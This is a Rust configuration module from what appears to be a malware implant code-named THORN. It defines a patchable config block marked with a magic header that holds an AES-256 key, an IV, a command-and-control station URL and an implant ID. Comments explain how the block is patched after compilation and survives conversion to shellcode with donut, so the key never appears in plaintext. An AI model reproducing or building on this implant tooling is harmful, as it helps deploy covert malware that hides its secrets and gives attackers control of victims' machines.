// config.rs
// IMPLANT_CONFIG is a static block with a known magic header.
// At compile time it contains placeholder bytes.
// patch_config.py finds the magic and patches key/iv/url/imp_id
// before the binary is converted to shellcode with donut.
// The key and IV never appear as plaintext in the source or final binary.

#[repr(C)]
pub struct Config {
    pub magic:  [u8; 8],    // THORNCFG — used by patch script to locate the block
    pub key:    [u8; 32],   // AES-256 key    (patched)
    pub iv:     [u8; 16],   // AES-CBC IV     (patched)
    pub url:    [u8; 256],  // Station URL    (patched, null-terminated)
    pub imp_id: [u8; 64],   // Implant ID     (patched, null-terminated)
}

// Non-zero placeholders ensure the block lands in .data (not .bss)
// so it is present as-is in the PE and therefore in the donut shellcode.
#[no_mangle]
pub static mut IMPLANT_CONFIG: Config = Config {
    magic:  *b"THORNCFG",
    key:    [b'K'; 32],
    iv:     [b'I'; 16],
    url:    [b'U'; 256],
    imp_id: [b'D'; 64],
};

impl Config {
    pub fn key(&self) -> &[u8; 32] { &self.key }
    pub fn iv(&self)  -> &[u8; 16] { &self.iv  }

    pub fn url(&self) -> String {
        let end = self.url.iter().position(|&b| b == 0).unwrap_or(256);
        String::from_utf8_lossy(&self.url[..end]).to_string()
    }

    pub fn imp_id(&self) -> String {
        let end = self.imp_id.iter().position(|&b| b == 0).unwrap_or(64);
        String::from_utf8_lossy(&self.imp_id[..end]).to_string()
    }
}
